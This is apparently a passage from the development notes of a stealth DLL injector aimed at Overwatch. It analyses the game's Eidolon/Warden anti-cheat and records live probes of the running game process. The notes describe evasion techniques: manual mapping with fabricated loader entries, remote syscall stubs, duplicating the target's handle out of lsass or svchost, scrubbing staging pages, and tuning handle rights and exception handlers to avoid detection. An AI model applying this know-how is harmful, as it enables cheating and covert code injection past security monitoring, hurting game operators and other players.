| `0x62830` | `eidolon_run` | parse export directory; note C1/C2 use a *different* entry |
| `0x612C11 â†’ 0x621BE7` | Eidolon XOR entry | moved in 19 days; re-find each build |
| `0x1E7040` / `48 8B 01 C3` | decrypt gadget (WoW) | signature only, never the RVA |
| `sub_2C1360`, `off_926702`, `qword_4ACxxx` | C3 symbols | C3 explicitly hedges these |

## D15. WRONG â€” internal inconsistencies

- **"6 distinct sources"** then lists **8** (CPU, MachineGuid, Disk HardwareID, MAC, HID,
  Volume, ComputerName, UserName).
- **"31 DLLs each with exactly 1 decoy import"** but the table lists **13 rows** and row 2
  (ntdll) has **2** APIs. Â§5.4 lists **41** DLLs. Three different counts in one post.
- **`DWORD[0]` is given two simultaneous values** (`0x02F8248C` and `0xC9EF16A9`) for the
  same address. Impossible. Only the *rotation* claim survives â€” and C2 independently
  corroborates that constants do change per build.
- **4-layer key chain "Layer 4: Checksum validation"** â€” `layer4` is computed and then never
  used in the published pseudocode. A "validation" layer that validates nothing.
- **"C3 + CC ret sled anti-analysis trick"** â€” `C3` followed by `CC` padding is what MSVC
  emits for any function body it has optimised to nothing, and is standard inter-function
  padding. Anti-analysis intent is asserted, not shown. (Note C1/C2 get a *working* entry
  point â€” so whatever the mechanism, the "calling this export does nothing" framing is
  incomplete.)
- **`VerSetConditionMask`** â€” the real API is `SetWaitableTimer`/`VerSetConditionMask` is a
  genuine ntdll export but is not what any loader would need; likely a transcription of
  `SetEvent`/`WaitForSingleObject`. `[UNV]`
- **"49 False Positive MZ Headers (from `0x00 0x00`)"** â€” `MZ` is `4D 5A`. `00 00` is not a
  prefix of anything.
- **"GetTickCount64, sub-millisecond, >2Ã— heuristic"** â€” invented. Measured tick granularity
  on this host is 15â€“16 ms (see F). Tick cannot resolve sub-millisecond deltas at all.
  *Our own measurement:* 2000 `GetTickCount64` samples â†’ 3 distinct values, min step 15â€“16ms;
  QPC frequency 10000000. Use QPC/RDTSC.
- **`+0x0BC: ULONG NtGlobalFlag`** â€” standard x64 PEB has `NtGlobalFlag` at **+0xD0** and
  `ImageBaseAddress` at **+0xC8**. `+0xBC` matches neither x86 nor x64. Compounded by C2
  reading "ImageBase" at `+0x10` and C1 tracing `+0x38`. **Three artifacts, three different
  PEB offsets â€” dump your own PEB.**
- **`.gxfg`** â€” plausible for Intel XFG bitmap metadata on a 2026 build, but non-standard
  next to `.gfids`/`.giats`. Verify against the actual section table.
- **SHA-1 K constants as a finding** â€” `0x5A827999`/`0x6ED9EBA1`/`0x8F1BBCDC`/`0xCA62C1D6`
  are the universal SHA-1 round constants. Finding them establishes that SHA-1 is *present*,
  not what is hashed, not that the pipeline is SHA-1â†’RC4â†’RSA.
- **"76 exports extremely unusual for an exe"** â€” exes built as DLL-equivalents, plugins,
  and .NET/hosted images export routinely. Also: *exports from an EXE are irrelevant to
  import resolution*; nothing about them explains "nothing to hook".
- **"File integrity check / Memory Validation / Code Integrity Scan" purposes** â€” asserted
  for unclassified strings (D11).

## D16. Still open from the OP's own text

- `.data` virtual `0xCB000` vs raw `0x1C000` â€” the inference *"Likely used for Dynamically
  allocated structures"* is reasonable but unstated as a hypothesis; BSS-style zero-fill is
  the boring explanation.
- "1.2M" / "24k" INT3 counts have no stated measurement method, region boundaries, or
  whether they are unique-byte counts or total occurrences.
- `0x000002B968630000` static placeholder: not a valid pointer either (bit 47 set, upper
  bits zero â†’ also non-canonical). Consistent with encrypted data, not with an address.

---

# PART E â€” RETRACTED `[MY]` â€” our own measurement killed it

## E0. Withdrawn

**An earlier revision of this file made a confident deduction that does not survive contact
with a measurement. It is recorded here rather than deleted, because the failure mode is
instructive.**

The claim was: the OP's static 1.2M `0xCC` in `Overwatch.exe` `.text` versus a claimed
runtime count of 0 is the signature of **demand-paged `.text` decryption in the executable
itself**, not CFG padding â€” and therefore all exe-side static analysis reads decoy bytes.

Our own query-only census of a live `Overwatch.exe` (PID 10244), 2026-10-15, post-injection:

```
INT3:....... 1199181 of 31457280 sampled bytes are INT3 (0xCC), 3%,
            from 905 of 905 exec region(s)
```

**1,199,181 `0xCC` bytes present at runtime.** That is essentially the OP's static figure,
still there. The premise of the deduction â€” "runtime = 0" â€” does not hold.

The OP also reported 24,000 `0xCC` in the loader at runtime. 24k + 0 â‰  1.2M. So the OP's
"runtime 0 in exe" line was either scoped wrong, measured differently, or wrong; **either way
the staticâ†’runtime transition he claimed cannot be used as evidence of anything**, and the
deduction built on top of it is withdrawn.

**What survives:**

- **D6 stands (the OP did not justify "CFG"), but the correct answer is now neither CFG nor
  demand-paging** â€” it is most likely ordinary MSVC inter-function padding. ~3% of sampled
  executable bytes being `0xCC` is unremarkable for a large x64 image. The OP's attribution
  was unsupported; so was my correction.
- **Part F's posture is unaffected.** We never acted on Part E. `HookRestore=N`,
  query-only, scan-only were already the conservative choice on the strength of Â§12.7/Â§F3
  (continuous integrity hashing, overlay surfaces), not on Part E.

**Method note, kept because it is the reusable lesson:** the previous file asserted a
mechanism from a source's *interpretation* of two numbers, without ever scoping what those
numbers were measured over. The OP's was scoped to one module; **our census was scoped to
one module too** (see E1a â€” the "process-wide" label on it was wrong). **These are not
comparable, and neither was honestly labelled.** Any future claim about `0xCC`, `.text`
counts, or encryption state must state its region scope.

## E1a. CORRECTION (2026-10-21) â€” the census was per-module, and the label on it lied

**This file, in E0, E1, F1a and F5, repeatedly describes our own census as "process-wide".
It was not.** The census walks `base â†’ base + modBaseSize` for the target's main module and
stops there (`Interface/Source/Interface/Stealth.cpp`, the walk bound is the module's own
image extent). Every region it counted â€” guard, no-access, executable, INT3 â€” was therefore
**inside `Overwatch.exe`'s image range by construction**. The report line that said
"Process-Wide" was simply mislabelled, and this file inherited the label and reasoned from
it.

Three consequences, all of which change what is still open:

1. **The E1 discriminator is already answered.** E1 asked "how many of those 906 no-access
   regions fall inside the image range, versus outside it?" The answer is **all of them** â€”
   the walk cannot count a region outside the image. The "filter on data we are already
   collecting" framing was wrong: the out-of-image count was never collected.
2. **F5 item 6 ("`0xCC` census scoped per module") was already done.** The census is
   per-module.
3. **The numbers that were never examined are the interesting ones.** From the shipped run
   log (`Build/Release/Ak1ubQ0g.log`, PID 6640), all inside one module's image range:

   | Measurement | Value |
   |---|---|
   | Committed regions walked | 1,894 |
   | Executable regions | **894** |
   | `PAGE_NOACCESS` regions | **895** (~17,856 KB) |
   | Guard pages | 0 |
   | `0xCC` / sampled | 1,197,804 / 31,178,752 (3.8%) |

   **894 separate executable regions inside one shipped x64 image** is not a normal PE
   layout â€” an ordinary image has one to three. And the executable count (894) and the
   no-access count (895) are within one of each other, which is the shape of "every
   executable page has an inaccessible twin".

   That pairing is *directionally* the C5 / AutoDump demand-paging model: Eidolon guards
   regions as `PAGE_NOACCESS` and forces decryption through a touch gadget, so the
   inaccessible half of the pair is the undecrypted half of the image. It is consistent with
   it; it is not by itself proof of it, and the alternative (a game whose image is
   deliberately fragmented) is not excluded.

   **This is the observation Part E should have made.** Part E built its demand-paging
   theory on the `0xCC` count, which was the wrong number, retracted it, and left the
   region-shape evidence â€” sitting in the same table â€” unexamined and labelled "a count
   with no attribution".

   **Do not** promote the region pairing to a conclusion either. Promote it to a *lead*, and
   settle it the same way AutoDump settles it: look for the touch gadget and for the
   `.eid` page in the loader.

## E1. The live measurement that *is* worth chasing

The same census produced something more interesting than the `0xCC` count:

```
Overwatch.exe........... untrapped (1916 committed region(s) walked)
   guard:...... 0 region(s), 0 KB
   no-access:.. 906 region(s), 18004 KB
```

**906 `PAGE_NOACCESS` regions totalling ~18 MB in a running game, and zero guard pages.**

- The `PAGE_NOACCESS` part is *directionally* consistent with C5: AutoDump documents
  Eidolon guarding regions as `PAGE_NOACCESS` specifically (not guard pages) and forcing
  decryption via a touch-gadget. Zero guard pages is therefore *expected* for that model and
  is not evidence against it.
- As of E1a, the "is it in-image or in free space" ambiguity is **resolved**: the walk was
  bounded to the module's image range, so all 906 were in-image. What is still missing is
  *which* module and *which* section, which the 2026-10-21 tooling change now reports
  directly (per-module, and with the loader located by its encrypted-core section rather
  than by name).
- Zero guard pages remains consistent with C5's `PAGE_NOACCESS` model.

**Do not** repeat Part E's mistake and promote this to a conclusion before the gadget hunt
is done.

## E2. What the run *did* settle

Closed by measurement this run (see D13 and F1 for the full table):

| OP claim | Our live read-back | Verdict |
|----------|--------------------|---------|
| Â§1: exe has exactly **one** import | **1 descriptor** in `Overwatch.exe` | **CONFIRMED** |
| Â§3.2: exe exports **76** symbols | **94 funcs / 76 names** | **CONFIRMED** â€” the number is exact |
| Â§1: exe has **3** TLS callbacks | **3 configured** (remote array) | **CONFIRMED** |
| Â§3.1: `Guard Flags: 0x100` = CFG instrumented | **`GuardFlags = 0x00000100`**, load config 320 | **CONFIRMED** - the OP was right; see D6a |
| Â§6.2/Â§2: target registers a VEH handler | **`UsingVEH=YES`**, CrossFlags `0x5` | **CONFIRMED** (existence only) |

The single-import and 3-TLS-callback results matter most: they are the OP claims a sceptic
would attack first, they are cheap to check, and they **hold**. The exports number matching
to the digit (76) is a strong signal that this run is reading the same structure the OP did.

**The CFG row of this table was wrong and has been corrected** (D6a): the OP's GuardFlags: 0x100 is exactly what the target's load config says.

---

# PART F â€” Implications for this injector

Our posture is unchanged and, if anything, better justified by Part E: **query-only,
scan-only, no writes to any game-backed page, no handlers installed in the target.**

## F1. Already closed (our own measurements, this host, Win11 26300 x64)

### F1a. **Live `Overwatch.exe` â€” run 2026-10-15, PID 10244** `[NEW â€” closes open questions]`

Read-back values from the stealth verification suite. All query-only, no writes to
game-backed pages.

| Probe | Result | What it settles |
|-------|--------|-----------------|
| Target import descriptors | **1** | **OP Â§1 CONFIRMED.** Single-import shape holds on this build |
| Target exports | **94 funcs / 76 names** | **OP Â§3.2 CONFIRMED to the digit** |
| Target TLS callbacks | **3 configured** (remote array) | **OP Â§1 CONFIRMED**; remote walk + out-of-image refusal rule both exercised |
| Target VEH | **`UsingVEH=YES`**, CrossFlags `0x00000005`, PEB `0x2B3000` read back | A VEH handler **is** registered. Existence only â€” see D2 for why this is not debugger precedence |
| Target debug port | **UNKNOWN** (query failed) | Correctly **not** reported as clean â€” see F1c for the handle-rights correction |
| Target CFG policy | **enable 0, strict 0** | The *policy* is off. The OP's *declaration* is exactly right - D6a |
| Trap census | `untrapped`; **1916** committed regions walked | **Scoped to the main module's image range** â€” see E1a |
| Guard pages | **0 regions, 0 KB** | No `PAGE_GUARD` anywhere â€” consistent with C5's `PAGE_NOACCESS` model, but also just a clean process |
| `PAGE_NOACCESS` | **906 regions, 18,004 KB** | **All inside the main image** (E1a). ~18 MB no-access in a running game's own image. Lead only â€” E1 |
| `0xCC` census | **1,199,181** of 31,457,280 sampled (3%), **905 of 905** exec regions | **Retracts Part E** â€” the `0xCC` are present at runtime. Per-module scope |

**What this run closes:** open questions G5 (imports â€” 1, OP shape, so the Eidolon loader
*is* present on this build), G3 partly (structural claims hold), and the D14 staleness
question for import count / export count / TLS count on *this* build.

**What it opens:** the 906 no-access regions (E1/E1a), and the load-config-vs-policy ambiguity
for CFG (D6a).

**Caveat on scope, corrected in E1a:** the `0xCC` and no-access censuses were **not**
process-wide. They were bounded to the target's main module image range, so they are
directly comparable in scope to the OP's single-module figures â€” and, like them, they
should not be quoted without that scope. The 2026-10-21 tooling change reports the range
explicitly and adds the free-address-space / in-image split, so the ambiguity cannot recur.

### F1b. Local baselines â€” clean Store-notepad, negative control

| Check | Baseline | Proves |
|-------|----------|--------|
| Remote import descriptors (terminator-capped) | 39 descriptors, multi-import | the counter + 3-way print (1 = OP shape, 0 = packed/heap-trampoline, N = Eidolon absent) |
| Remote exports (single 40B RPM, no name walk) | 64 funcs / 0 names (ordinal-only) | read-back vs read-back |
| Remote TLS callbacks (in-image-only, cap 64) | 2 configured, terminator found | the walk + out-of-image refusal rule |
| VAD RX census (full `VirtualQueryEx` walk, cap 100k) | image-RX 110 / private-RX 0 / mapped-RX 0 | a clean *notepad* has **zero** private-RX â€” any private-RX is VAD-visible with no loader entry |

**CORRECTION (2026-10-25) â€” the notepad baseline does not transfer to the target.** A
fresh, un-injected `Overwatch.exe` was measured carrying **2 private-RX regions of its
own** (4 process-wide after this load, of which the load's image accounted for exactly
2 â€” `.text` and the protected section â€” by address-range attribution). The "zero
private-RX" row above stays as the notepad control it was measured on; it must not be
quoted as the game's baseline. Attribution on the target now splits private-RX into
*this load's image* vs *pre-existing* by address range, so the delta is what a Warden
self-census would newly see, not the raw count.

Notepad is the negative control: multi-import, no VEH, no debugger, nothing injected. The
Overwatch run above is the positive case, and the two differ exactly where they should.

### F1c. Debug-port and timing facts

| Check | Result | Consequence |
|-------|--------|-------------|
| `ProcessDebugPort` / `ProcessDebugFlags` classes | **7** and **31**; class 9 â‡’ `0xC0000003` | **Class is 31, not 9** â€” 9 is `ProcessAccessToken`. Anyone reusing "9" queries the token class by mistake |
| Debug reads on the 0x1010 handle | both â‡’ `0xC0000022` | on a handle with only `QUERY_LIMITED`, both debug reads fail |
| Debug reads on the 0x0410 handle | **both succeed** | see the correction below |
| `GetTickCount64` granularity | 2000 samples â†’ 3 distinct values, min step **15â€“16 ms**; QPC freq 10000000 | **Tick cannot resolve D15's "sub-ms / 2Ã— heuristic."** Use QPC/RDTSC for any timing work; treat Warden timing as coarse-window, not precision |
| Own-process debugger state | `IsDebuggerPresent`=FALSE, `CheckRemote`=FALSE | the check is live here; TRUE â‡’ operator error, not game state |

**CORRECTION (2026-10-21) â€” the handle policy in this table was wrong.** This file said the
launcher retains only `QUERY_LIMITED|VM_READ = 0x1010` and that the debug reads therefore
fail by design ("UNKNOWN, never clean"). **The code does the opposite:** the launcher opens
`PROCESS_QUERY_INFORMATION | PROCESS_VM_READ = 0x0410` **first**, and falls back to `0x1010`
only if that fails (`Interface/Source/Main.cpp`, the target handle open).

The shipped run log settles it:

```
[+] Target Debug Port............ 0000000000000000 (None Attached)
[+] Target Debug Flags........... 0x00000001 (Read Back)
```

So on this build the debug port **was** readable, and F1a's "Target debug port | UNKNOWN
(query failed)" row describes a configuration this tree does not have. That row, and the
"never clean" claim, are withdrawn.

**What replaces it, and it is a decision rather than an accident:** `0x0410` is a stronger
footprint than `0x1010` against a Warden that, per C3, probes `NtOpenProcess` and the
handle table. "Report UNKNOWN rather than clean" was a *better* posture. The fallback order
should now be an explicit choice â€” either drop to `0x1010` before the debug probes (and
report UNKNOWN), or keep `0x0410` and accept the extra right knowingly.

**DECIDED (2026-10-25):** the standing verification handle is `0x1010`
(`PROCESS_QUERY_LIMITED_INFORMATION | PROCESS_VM_READ`). It is opened first, and a
`VirtualQueryEx` probe is run against it immediately; only if the census cannot run on the
limited right is `0x0410` opened as the escalation, and the report names which posture was
taken by reading the granted mask back off the handle. The debug-port probes report
**UNKNOWN** on the limited right â€” the refusal (`STATUS_ACCESS_DENIED` on both classes) is
named in the output as "refused by handle rights, QUERY_LIMITED posture by decision;
not queryable, not reported clean" â€” so the probe's absence is a recorded trade, never an
accident. C3's `NtOpenProcess`/handle-table probing now sees the weaker mask for the whole
run in the common case.

**Also corrected in the same pass:** the suite's "DllMain ms" figure was produced by
dividing a cycle delta by a hard-coded 3.2 GHz. The divisor is now measured at run time
against the performance counter, and when the calibration is unavailable the suite reports
the raw cycle count and claims no duration at all.

## F2. Live defect found and fixed while surveying

`Ameger/Native/Syscall.h` `ScrubRemoteRegion`: the first `ScProtectMemory` call never passed
`&old_protect`, so both restores applied protection `0` (invalid â‡’ syscall fails â‡’ region
left **RW**). Now captures and restores the real protection. Every scrubbed
trampoline/staging page was affected â€” a live stealth defect, not a survey gap.

Also caught en route: `DataDirectory` offset is `lfanew + 24 + (optsz âˆ’ 128)`, not `+96`.
The shipped C++ copies directories via `memcpy` from parsed headers and never had this bug;
only the PowerShell prototype did.

## F3. Priorities that went UP, with Part E and C3 added

| Priority | Item | Source |
|----------|------|--------|
| **HIGH** | **Handle-donor owner** â€” the process handle is obtained by duplicating a handle out of *another* process, and the shipped run took it from **lsass.exe**. `lsass` handle access is the most heavily monitored process on a Windows box, and C3 has Warden probing `NtOpenProcess` and the handle table. The scan also reads the whole system handle table (4.4 MB / 108k handles) and opens up to 16 foreign owners. **Not previously in this file's risk list at all.** Now mitigated: the donor owner is matched by name against a block list (credential stores, session stores, AV) *before* the owner process is opened, overridable with `AMEGER_DONOR_OWNER_BLOCKLIST`. | C3, run log |
| **HIGH** | **Overlay/input surfaces** â€” `EnumWindows` + `DwmGetCompositionTimingInfo` + `GetAsyncKeyState`. Our layered window and clipboard log are directly exposed. Neither the OP nor C3 discusses this against our architecture. | C3 |
| **HIGH** | **Continuous integrity hashing** â€” "Eidolon continuously hashes the Object Manager and other critical memory segments." Any write to a game-backed page is the highest-risk operation available to us. | C5 |
| **MED** | **Loader-side survey** â€” the loader is now *located* by its encrypted-core section rather than by name, and its region census is reported alongside the main image. Still unmeasured: its import table, TLS array, VEH state, `.eid` size and the `0x4ACxxx` pointer table. | G4, F5 |
| **MED** | **906 `PAGE_NOACCESS` regions / 18 MB** â€” now attributed to the main image (E1a) and reported per module. Still a lead, not a finding: the next step is the C5 touch-gadget hunt. | E1, E1a |
| MED | Battle.net Identity file (`SOFTWARE\Blizzard Entertainment\Battle.net\Identity\Identity`, reported 56 B / 8 B per line) â€” ban-state input. Single report; re-verify size. | C3 |
| MED | Pagefile signal (`GlobalMemoryStatusEx.ullTotalPageFile >> 20`) â€” VM/RAM-size spoofing now in scope. | C3 |
| MED | CPUID leaf-0 vendor + leaf-1 ECX/EDX â€” spoofing checklist item, **heavily hedged** in source. We spoof nothing here. | C3 |
| MED | IOCTL driver probing + `\BaseNamedObjects` shared-memory scan. MDL-backed shared memory reportedly **not** covered â€” a known gap to re-test, not a guarantee. | C3 |
| MED | WINTRUST / sfc integrity scope. | C3 |
| MED | Anti-debug beyond the PEB survey: the OP claims TLS-callback-time `RtlExitUserProcess`; AutoDump-style tooling scans TLS callbacks for 2 min every 10 ms, up to 64. | A, C5 |
| LOW | Eidolon emulation (Unicorn + `GS_BASE` + PEB/TEB, `RCX`â†’`RAX`, stop after return) â€” needed only if we ever must resolve an `.eid` string offline. Heavy; revisit only if something downstream requires it. | C1, C2 |

## F4. Standing decisions (unchanged, re-affirmed)

- **HWID family (Â§2.5) â€” excluded by instruction.** No work, no measurement, no storage.
- **`HookRestore = N`** â€” no writes to game `.text`, ever.
- **No handler installed in the target.** Our VEH work is a *read-only PEB survey* plus a
  local add/remove self-test. Note C5's own point: **adding a VEH is itself a chain
  artefact** â€” Warden's handler sees our handler in the list.
  **UPDATE (2026-10-25, revised same day after a measured regression): the debug-print
  protection is now two mechanisms, and the standing rule is "one first-chance guard,
  installed for the shell window only, plus an import redirection."** The shell points the
  payload's own `OutputDebugStringA/W` imports (ordinary and delay-load) at a bare `ret`
  in ntdll, so its logging never raises the exception at all; and a first-chance VEH
  absorbs `DBG_PRINTEXCEPTION_C`/`_WIDE_C` for everything the redirect cannot cover. The
  redirect-only variant was tried and **measured to kill the target**: a bare notepad
  (which does not preload `D3DCOMPILER_47.dll`) exited with code `0x40010006` â€” literally
  `DBG_PRINTEXCEPTION_C` â€” when the dependency's own init called `OutputDebugString` on
  the synthetic stack. A dependency's internal ODS cannot be redirected without patching
  a system module (a write to a non-our page, refused), so the guard is load-bearing and
  the C5 chain-window trade is accepted knowingly: chain entry for the shell window vs a
  terminated target. The launcher's failure hint now names this exit code when the
  target dies mid-load.
- **Scan-only.** `ScrubRemoteRegion` exists to clean *our own* staging pages, and now
  correctly restores their protection (F2).
- **`.eid` bytes â€” skip.** The encrypted core is now *identified* structurally (by its
  section) rather than by name, and its regions are reported as their own category and
  never read. Identification is not reading.
- **Crash-callback path â€” inaction.** A guarded callback is a bad thing to touch.
- **No handle escalation** for the debug-port survey â€” but see the correction in F1c: the
  launcher opens `0x0410` before it ever tries `0x1010`, so the escalation is already
  happening by default and the decision needs to be made explicitly rather than inherited
  from the order of two `OpenProcess` calls.

**Two states this section did not name, added 2026-10-21:**

- **The runtime does mutate the target's loader state, and always has.** The TLS stage
  fabricates an `LDR_DATA_TABLE_ENTRY` and an `LDR_DDAG_NODE` out of the target's own
  loader heap and calls `LdrpHandleTlsData` on them. That is not a game-backed page, but
  it is a write into the target's loader bookkeeping, and it is on by default
  (`ExecuteTLS = Y`). "No writes to game-backed pages" is true; "the target is untouched
  apart from its own mapped image" would not be.
  **UPDATE (2026-10-25): the mutation is now conditional.** A TLS directory that declares
  neither callbacks nor data skips the loader entirely â€” no fabricated entry, no PEB
  bitmap bit, no loader-heap churn; the skip is reported through the existing
  "no loader entry" telemetry. For images that *do* carry data (the current payload),
  the registration is retained by design; that case is unchanged and inherent.
- **The payload is not exception-covered, on purpose.** `EnableExceptions = N` means
  `RtlAddFunctionTable` is never called for the payload, so its unwind information is not
  registered and a fault in the payload lands in **Warden's** VEH handler. That is the
  right trade for stealth â€” no new chain entry â€” and the wrong trade for robustness, and it
  is a deliberate configuration rather than an oversight. The suite names it ("First-Chance
  Gap"). **The dormant alternative path is gone (2026-10-25):** the old fallback that
  inserted the image into the loader's inverted function table by writing ntdll's
  `.mrdata` under `LdrProtectMrdata(FALSE)` is removed; `RtlAddFunctionTable` (the
  documented dynamic table) is the only registration path, and a registration it cannot
  make fails the stage rather than being bought with an ntdll-backed write. Note the
  first-chance exposure itself is invariant to this flag: Warden's VEH runs before SEH
  dispatch either way, so the real risk is the payload faulting at all.

## F4a. NEW (2026-10-21) â€” the launcher runs elevated, so it never sees the environment it was started in

**This is a defect in our own tooling, found by the end-to-end verification run, and it
silently disabled every environment-based knob we had.**

The launcher's manifest declares `UACExecutionLevel=RequireAdministrator`. When Windows
elevates a process through the UAC broker, the elevated process is started with a **fresh
environment** built from the user's profile, not with the environment its parent had. Every
variable that was added to the parent after the profile was loaded â€” which is *every*
variable an operator sets on the command line â€” is simply gone.

Measured, not inferred: the launcher's own environment block was dumped at the first line
of `wWinMain` and compared against the parent shell's. The parent's block had
`AMEGER_AUTO_CONFIRM` and `AMEGER_KEEP_RESULT_LOG`; the launcher's block had **neither**,
while everything else (`TEMP`, `Path`, `PROCESSOR_ARCHITECTURE`, â€¦) was identical.

What that silently disabled:

| Knob | Consequence of it being ignored |
|------|-----------------------------------|
| `AMEGER_SURVEY_MAX_REGIONS` / `_MAX_MB` / `_MAX_SAMPLE_REGIONS` | **The census bounds did not exist.** The region survey could walk an unbounded number of regions and read an unbounded number of bytes out of the target. That is a stealth problem as much as a stability one. |
| `AMEGER_VERBOSE` | The runtime's own trace was off regardless of what the operator asked for. |
| `AMEGER_AUTO_CONFIRM` | The operator confirmation could not be skipped. (Harmless â€” arguably correct â€” but it was an accident, not a decision.) |
| `AMEGER_FULL_CENSUS` | The full thread census could not be requested. |
| `AMEGER_DONOR_OWNER_BLOCKLIST` | The donor-owner block list (F3, HIGH) **would not have applied at all.** The mitigation would have looked present and done nothing. |

**The fix:** every knob now lives in the configuration file, which is read *after* the
elevation. `[General]` gained `KeepResultLog`, `SurveyMaxRegions`, `SurveyMaxMb`,
`SurveyMaxSampleRegions` and `DonorOwnerBlocklist`. The environment variables remain as a
secondary override for the case where the launcher is run unelevated, and the donor block
list is published into the launcher's own environment so the runtime â€” which is loaded
*into* the launcher process â€” sees it.

**The general lesson, and it is the same one this file keeps relearning:** a setting that
is read from a place the process does not control is not a setting. Every knob that matters
now has a read-back, and the verification run exercises the knobs rather than assuming them.

## F4b. NEW (2026-10-21) â€” the exe's own control flow guard declaration is now readable

The suite used to read the target's *process* CFG policy (`enable 0 strict 0`) and compare
it against the OP's claim of `GuardFlags: 0x100`, with no way to tell whether the OP had
read the right field. It now reads the image's own
`IMAGE_LOAD_CONFIG_DIRECTORY64.GuardFlags` (x64 offset `0x90`) in the same run and prints
both side by side.

**First read-back (against a clean x64 system image, not Overwatch):**

```
Target CFG Policy: Enable 0 | Strict 0.
Target Load Config: GuardFlags = 0x00017500 | CFG Instrumented = Yes | Load Config Size = 320
```

Two things follow immediately:

1. **`Load Config Size = 320` matches the OP's "Load Config Size: 320 Bytes" exactly.** A
   second independent OP detail reproduced.
2. **`GuardFlags = 0x00017500` has `IMAGE_GUARD_CF_INSTRUMENTED` (`0x100`) set**, and the
   CFG *policy* is off. That is precisely **D6a Reading A** â€” the image declares the
   feature, the process does not enforce it â€” which is the reading that leaves the OP's
   Â§3.1 intact rather than refuted. On the target the same read decides D6a outright.

Note also the x64 layout trap this exposed: the SDK's `IMAGE_LOAD_CONFIG_DIRECTORY` is the
**32-bit** structure, and its `SecurityCookie` offset (`0x38`) is not the 64-bit one
(`0x58`). The suite was reading the security cookie out of the wrong field. The 64-bit
offsets are now stated explicitly.

## F4c. NEW (2026-10-21) â€” the donor handle is now taken from a screened owner

The shipped run took the target's process handle out of **`lsass.exe`** (F3, HIGH). The
donor owner is now matched by name against a block list â€” the credential and session
stores, and the endpoint processes â€” **before that owner is ever opened**, and the count of
skipped owners is reported. In the verification run: `Blocklisted = 399`, and the donor came
from `svchost.exe`.

The owner image names come from a single process snapshot, so identifying a blocked owner
costs no additional process opens. The list is configurable through
`[General] DonorOwnerBlocklist` (see F4a for why it is not an environment variable).

## F4d. NEW (2026-10-21) â€” a target with no published loader list cannot be mapped into

**Found by the test-mode run, and it applies to any target, not just a scratch one.**

The remote shell's dispatch table holds absolute addresses taken from *this* process's
ntdll, and the remote syscall stubs jump through a gadget in that same image. Both are only
meaningful in the target while ntdll sits at the same base in both processes, so the base
is confirmed by walking the target's PEB loader list before anything is written.

**A process whose PEB carries a null loader pointer has not published its loader list, and
there is nothing to walk.** Measured, not inferred:

| How the target was started | Target's `PEB->Ldr` |
|---------------------------|---------------------|
| `CreateProcessW` + `CREATE_NEW_CONSOLE` + `SW_HIDE` | **null**, persistently |
| `CreateProcessW`, plain | valid |
| `CreateProcessW` + `DETACHED_PROCESS` | valid |
| launched through the shell | valid |

The first row is a genuine Windows state, not a broken read, and it held for the whole
life of the process. Two things were fixed:

- **The runtime falls back to the loader's own module list.** When the PEB walk cannot
  produce ntdll's base, the kernel's module list is consulted instead. It is built from the
  same data and is available in exactly the state where the PEB pointer is not published.
  The failure mode before this was a hard refusal to load.
- **The launcher refuses to target a process that cannot be written to.** The candidate
  list is filtered on the same condition, so a helper process is never picked and the
  failure is a clear message rather than a late one.

## F4e. NEW (2026-10-21) â€” modern images run several same-named processes, and one of them is a broker

This is the trap under F4d, and it is worth stating on its own because it applies to
*selecting* a target, not only to loading into one.

`notepad.exe` on this host is a broker: it starts the real instance and then exits. Six
processes were running under that one image name after a single shell launch. The
consequences:

- **The first name match is not the real instance.** The launcher now takes the candidate
  with the largest working set among those that have published a loader list, which is
  the main instance rather than a helper beside it.
- **A broker that has not exited yet is a target that dies mid-load.** The injector
  detected it correctly ("the target process exited during loading") and refused, but the
  scratch target is now given time to settle, and the guard closes the whole family of
  instances that appeared because the launcher started it â€” not just the one process it
  spawned.

## F4f. NEW (2026-10-21) â€” a thread whose handle cannot be opened was never excluded

**A real reliability bug in the donor search, found by the test run.**

The thread donor search records the thread it has chosen so that a failed attempt can be
excluded from the next round. That record was written *after* the handle was acquired, so
a thread whose handle could not be opened â€” because it had exited in the meantime â€” was
never excluded. Every round picked the same dead thread, and the search exhausted its
budget without moving on. The recorded thread is now written as soon as it is chosen.

The symptom in the log is worth recording because it looks like a permissions problem and
is not:

```
Opened Thread 00120C No Longer Belongs To The Target Process; Discarding
OpenThread Failed
Donor Round 16/16, 3 Candidate(s) Excluded
```

The thread had exited. The search was not being refused; it was being held on a corpse.

## F4g. NEW (2026-10-21) â€” test mode, and what it is for

`[General] TestMode` forces the target to a harmless image, allows the handle donor scan
to fall back to a direct handle, and makes the run write its transcript whatever the
outcome. `[General] TestTarget` chooses the image.

Four things were wrong with it and are now fixed:

- **It silenced the report.** It forced `Quiet`, `DetachConsole` and `VerboseTrace` off
  regardless of what the configuration said, so a test could not be read. Those are the
  operator's settings and the configuration already has keys for them; test mode now
  changes only what test mode is *for*.
- **It left the target behind.** It now starts a scratch target when the operator has
  none open, and closes it - and any instance that came with it - when the run ends. An
  instance the operator already had running is never touched.
- **It could be mistaken for a real run.** The trace carries a `Test Mode` section, the
  console carries a `TEST MODE` line, the load-result block carries a `Run Mode` row, the
  final line is `[Result] [TEST MODE] Mapped At ...`, and the phase summary reads
  `Success (Test Mode)`.
- **It put a window on the operator's desktop.** The scratch target is started hidden,
  and the window of the process that was *actually selected* is hidden as well - several
  modern images start a broker that hands off to the real instance, and the real instance
  puts its own window up regardless of how the broker was started.

### The modern-notepad problem, which is worth recording

`notepad.exe` on current Windows is a **broker**: it starts the real instance and exits.
That produced three distinct failures, all of which looked like something else:

1. **The target exited during the load.** The injector picked the broker, which was about
   to leave. The scratch target is now given time to settle - the launcher waits until
   the set of processes under that image name stops changing - before the target is
   chosen.
2. **A target with no published loader list.** A process whose PEB carries a null loader
   pointer cannot be mapped into. The launcher now filters candidates on that condition
   and prefers the one with the largest working set, which is the main instance rather
   than a helper beside it.
3. **A stale target pinned the build directory.** A process holds its working directory
   open, so a scratch target that inherited the launcher's directory kept that directory
   locked, and the next `Create.bat` could not write into it. The scratch target is now
   started in the temporary directory, and the family is collected at close time rather
   than at start time.

**And the underlying measurement was wrong.** An earlier revision of this file concluded
that `CREATE_NEW_CONSOLE` leaves the target's loader data unpublished, on the strength of
one reading. A re-measurement with the same flags showed a valid loader list every time:
the reading was a timing artefact of the *first* notepad launched in a session, which is
the broker mid-handshake. The "avoid `CREATE_NEW_CONSOLE`" advice was based on a bad
measurement. The fallback that was added in response to it - reading ntdll's base from the
kernel's module list when the PEB walk cannot produce it - is still correct and is still
worth having, but it was not fixing what it was meant to fix.

### The transcript, and how a run records itself

